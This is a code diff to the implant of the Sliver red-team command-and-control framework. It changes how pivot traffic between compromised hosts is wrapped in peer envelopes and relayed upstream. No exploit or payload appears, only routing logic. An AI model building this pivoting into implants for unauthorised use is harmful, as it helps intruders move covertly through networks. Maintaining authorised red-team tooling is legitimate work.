@@ -29,6 +29,7 @@ import (
 	"sync"
 	"time"
 
+	consts "github.com/bishopfox/sliver/implant/sliver/constants"
 	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
@@ -74,27 +75,38 @@ func StopListener(id uint32) {
 
 // SendToPeer - Forward an envelope to a peer
 func SendToPeer(envelope *pb.Envelope) bool {
+	peerEnvelope := &pb.PivotPeerEnvelope{}
+	err := proto.Unmarshal(envelope.Data, peerEnvelope)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to unmarshal peer envelope: %s", err)
+		// {{end}}
+		return false
+	}
 	downstreamEnvelope := &pb.Envelope{}
-	err := proto.Unmarshal(envelope.Data, downstreamEnvelope)
+	err = proto.Unmarshal(peerEnvelope.Data, downstreamEnvelope)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to unmarshal downstream envelope: %s", err)
 		// {{end}}
 		return false
 	}
-	sent := false
+
+	// NOTE: Yes linear search is bad, but there should be a very small
+	// number of listeners and pivots so it should be fine
+	sent := false // Controls iteration of outer loop
 	pivotListeners.Range(func(key interface{}, value interface{}) bool {
 		listener := value.(*PivotListener)
 		listener.Pivots.Range(func(key interface{}, value interface{}) bool {
 			pivot := value.(*NetConnPivot)
-			if pivot.ID() == envelope.ID {
+			if pivot.ID() == peerEnvelope.PeerID {
 				pivot.Downstream <- downstreamEnvelope
 				sent = true  // break from the outer loop
 				return false // stop iterating inner loop
 			}
-			return true // Keep iterating
+			return true // keep iterating inner loop
 		})
-		return sent
+		return !sent // keep iterating while not sent
 	})
 	return sent
 }
@@ -219,9 +231,14 @@ func (p *NetConnPivot) Start(pivots *sync.Map) {
 				// {{if .Config.Debug}}
 				log.Printf("[pivots] received peer envelope, upstreaming ...")
 				// {{end}}
-				data, _ := proto.Marshal(envelope)
+				envelopeData, _ := proto.Marshal(envelope)
+				data, _ := proto.Marshal(&pb.PivotPeerEnvelope{
+					PeerID: p.ID(), // Our Peer ID
+					Name:   consts.SliverName,
+					Data:   envelopeData,
+				})
 				p.upstream <- &pb.Envelope{
-					ID:   p.ID(),
+					ID:   0, // Pivot server implementation uses handlers, so ID must be zero
 					Type: pb.MsgPivotPeerEnvelope,
 					Data: data,
 				}
